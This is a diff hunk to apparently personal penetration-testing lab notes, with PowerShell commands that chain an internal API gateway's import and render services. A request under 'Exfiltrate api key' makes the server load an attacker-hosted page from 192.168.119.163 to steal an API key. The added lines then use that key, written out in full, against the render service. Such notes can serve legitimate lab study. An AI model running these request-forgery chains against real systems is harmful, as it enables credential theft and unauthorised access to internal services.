@@ -68,3 +68,7 @@ Exfiltrate api key
 ```powershell
 iwr -uri http://apigateway:8000/files/import -method Post -body (@{"url"="http://172.16.16.2:9000/api/render?url=http://192.168.119.163/api-key-extraction.html"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
 ```
+Authenticated request to /render service
+```powershell
+iwr -Uri http://apigateway:8000/render -Header @{"apiKey"="SBzrCb94o9JOWALBvDAZLnHo3s90smjC"}  -method Post -body (@{"url"="http://192.168.119.163"}|convertto-json) -ContentType 'application/json' -SkipHttpErrorCheck
+```
